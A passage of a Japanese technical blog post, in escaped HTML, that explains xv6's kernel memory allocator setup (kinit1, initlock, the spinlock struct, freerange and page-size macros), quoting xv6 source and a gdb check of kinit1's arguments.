&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;EXTMEM&lt;/span&gt;  &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0x100000&lt;/span&gt;            &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Start of extended memory&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;PHYSTOP&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0xE000000&lt;/span&gt;           &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Top physical memory&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;DEVSPACE&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;0xFE000000&lt;/span&gt;         &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// Other devices are at high addresses&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;このメモリ領域の割り当てと解放はページ単位で行われます。&lt;/p&gt;
&lt;p&gt;カーネルは、解放されたページを連結リスト型で保持しており、割り当て時にはリストからそのページを削除する動きになります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://pdos.csail.mit.edu/6.828/2018/xv6/book-rev11.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 - DRAFT as of September 4, 2018 P32-33&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;http://www.coins.tsukuba.ac.jp/~yas/coins/os2-2011/2012-01-24/&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;メモリ管理、アドレス空間、ページテーブル&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;kinit1関数の引数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#kinit1%E9%96%A2%E6%95%B0%E3%81%AE%E5%BC%95%E6%95%B0&quot; aria-label=&quot;kinit1関数の引数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;kinit1関数の引数&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kinit1&lt;/code&gt;では、引数として受け取ったカーネルのendアドレスから4MiBまでの領域を「ロックなし」で使用できるようにするためのアロケータの初期化を行います。&lt;/p&gt;
&lt;p&gt;ここから&lt;code class=&quot;language-text&quot;&gt;kinit2&lt;/code&gt;関数が呼び出されるまでは、カーネル末尾から4MiB分のアドレスをロックなしで割り当てられるようにした状態で稼働します。&lt;/p&gt;
&lt;p&gt;これは、&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数内で呼び出されている処理の大部分ではロックや4MiB以上のメモリ領域を使用することができないからであるようです。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kinit1&lt;/code&gt;関数の引数には、&lt;code class=&quot;language-text&quot;&gt;vstart&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;vend&lt;/code&gt;が与えられています。&lt;/p&gt;
&lt;p&gt;まず第1引数の&lt;code class=&quot;language-text&quot;&gt;vstart&lt;/code&gt;に該当する引数ですが、これは&lt;code class=&quot;language-text&quot;&gt;main.c&lt;/code&gt;で宣言されている以下の変数です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;extern&lt;/code&gt;宣言がされており、&lt;code class=&quot;language-text&quot;&gt;kernel.ld&lt;/code&gt;で定義された&lt;code class=&quot;language-text&quot;&gt;PROVIDE(end = .);&lt;/code&gt;を取得しています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; end&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// first address after kernel loaded from ELF file&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;また、&lt;code class=&quot;language-text&quot;&gt;vend&lt;/code&gt;には&lt;code class=&quot;language-text&quot;&gt;P2V(4*1024*1024)&lt;/code&gt;が与えられています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;P2V&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;memlayout.h&lt;/code&gt;で定義されたマクロで物理アドレスを仮想アドレスに変換する(=単純にKERNBASEを加算する)だけのマクロです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name function&quot;&gt;V2P&lt;/span&gt;&lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; KERNBASE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; KERNBASE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;呼び出し時には&lt;code class=&quot;language-text&quot;&gt;4*1024*1024&lt;/code&gt;(=4MiB)にKERNBASEを加算した&lt;code class=&quot;language-text&quot;&gt;0x80400000&lt;/code&gt;が与えられます。&lt;/p&gt;
&lt;p&gt;実際に&lt;code class=&quot;language-text&quot;&gt;kinit1&lt;/code&gt;呼び出し時の引数をgdbで確認したところ次のようになりました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;kinit1 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;vstart&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;0x801154a8, &lt;span class=&quot;token assign-left variable&quot;&gt;vend&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;0x80400000&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;順番が前後しますが、&lt;code class=&quot;language-text&quot;&gt;kinit1&lt;/code&gt;ではこの2つの値を&lt;code class=&quot;language-text&quot;&gt;freerange&lt;/code&gt;関数の引数として与えてメモリ領域の確保を行います。&lt;/p&gt;
&lt;p&gt;ソースコードを上から順に見ていきたいので、先に&lt;code class=&quot;language-text&quot;&gt;initlock&lt;/code&gt;関数を確認します。&lt;/p&gt;
&lt;h3 id=&quot;initlock関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#initlock%E9%96%A2%E6%95%B0&quot; aria-label=&quot;initlock関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;initlock関数&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;initlock&lt;/code&gt;関数は、&lt;code class=&quot;language-text&quot;&gt;spinlock.c&lt;/code&gt;で定義された関数で、&lt;code class=&quot;language-text&quot;&gt;kmem&lt;/code&gt;構造体内の&lt;code class=&quot;language-text&quot;&gt;spinlock&lt;/code&gt;構造体の初期化を行う関数です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kmem&lt;/code&gt;構造体は&lt;code class=&quot;language-text&quot;&gt;kalloc.c&lt;/code&gt;で以下のように定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;spinlock&lt;/span&gt; lock&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; use_lock&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;run&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;freelist&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; kmem&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;また、&lt;code class=&quot;language-text&quot;&gt;spinlock&lt;/code&gt;構造体は&lt;code class=&quot;language-text&quot;&gt;spinlock.h&lt;/code&gt;で定義された以下の構造体です。&lt;/p&gt;
&lt;p&gt;コメントには排他制御と書かれており、ロックを行う際に使用しているようです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Mutual exclusion lock.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;spinlock&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uint locked&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;token comment&quot;&gt;// Is the lock held?&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// For debugging:&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;name&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;        &lt;span class=&quot;token comment&quot;&gt;// Name of lock.&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;cpu&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;cpu&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;// The cpu holding the lock.&lt;/span&gt;
  uint pcs&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// The call stack (an array of program counters)&lt;/span&gt;
                     &lt;span class=&quot;token comment&quot;&gt;// that locked the lock.&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;initlock&lt;/code&gt;関数では、この&lt;code class=&quot;language-text&quot;&gt;spinlock&lt;/code&gt;構造体のポインタと名前の文字列を受けとって初期化を行っています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;initlock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;spinlock&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;lk&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;name&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  lk&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;name &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; name&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  lk&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;locked &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  lk&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;cpu &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kinit1&lt;/code&gt;からこの関数を呼び出す際には、「kmem」という名前で初期化を行っていることがわかります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;kinit1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;vstart&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;vend&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;initlock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;kmem&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  kmem&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;use_lock &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;freerange&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;vstart&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; vend&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;次の行では&lt;code class=&quot;language-text&quot;&gt;use_lock&lt;/code&gt;の値も0に初期化しています。&lt;/p&gt;
&lt;p&gt;ここではロックを無効化しています。&lt;/p&gt;
&lt;p&gt;しばらく後に呼び出される&lt;code class=&quot;language-text&quot;&gt;kinit2&lt;/code&gt;では、&lt;code class=&quot;language-text&quot;&gt;kmem.use_lock&lt;/code&gt;が1に設定されます。&lt;/p&gt;
&lt;p&gt;また、実際にここでは、単に&lt;code class=&quot;language-text&quot;&gt;kmem&lt;/code&gt;の初期化を行ったのみでロックは行われていません。&lt;/p&gt;
&lt;p&gt;ここで初期化した構造体を利用してロックを行うためには、&lt;code class=&quot;language-text&quot;&gt;spinlock.c&lt;/code&gt;で定義されている&lt;code class=&quot;language-text&quot;&gt;void acquire(struct spinlock *lk)&lt;/code&gt;関数を呼び出す必要があります。&lt;/p&gt;
&lt;p&gt;この関数については実際に使用するときに確認します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://pdos.csail.mit.edu/6.828/2017/homework/xv6-lock.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Homework: xv6 locking&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;freerange関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#freerange%E9%96%A2%E6%95%B0&quot; aria-label=&quot;freerange関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;freerange関数&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;freerange&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;kalloc.c&lt;/code&gt;で定義されている関数で、&lt;code class=&quot;language-text&quot;&gt;vstart&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;vend&lt;/code&gt;を引数にとり、&lt;code class=&quot;language-text&quot;&gt;PGROUNDUP&lt;/code&gt;を使用してアラインメントされた物理アドレス領域を解放する関数です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;freerange&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;vstart&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;vend&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  p &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;PGROUNDUP&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;vstart&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; p &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; PGSIZE &lt;span class=&quot;token operator&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;vend&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; p &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; PGSIZE&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;kfree&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;PGROUNDUP&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;mmu.h&lt;/code&gt;で以下のように定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Page directory and page table constants.&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;NPDENTRIES&lt;/span&gt;      &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;    &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// # directory entries per page directory&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;NPTENTRIES&lt;/span&gt;      &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;1024&lt;/span&gt;    &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// # PTEs per page table&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;PGSIZE&lt;/span&gt;          &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt;    &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// bytes mapped by a page&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;PTXSHIFT&lt;/span&gt;        &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;12&lt;/span&gt;      &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// offset of PTX in a linear address&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;PDXSHIFT&lt;/span&gt;        &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;22&lt;/span&gt;      &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// offset of PDX in a linear address&lt;/span&gt;&lt;/span&gt;

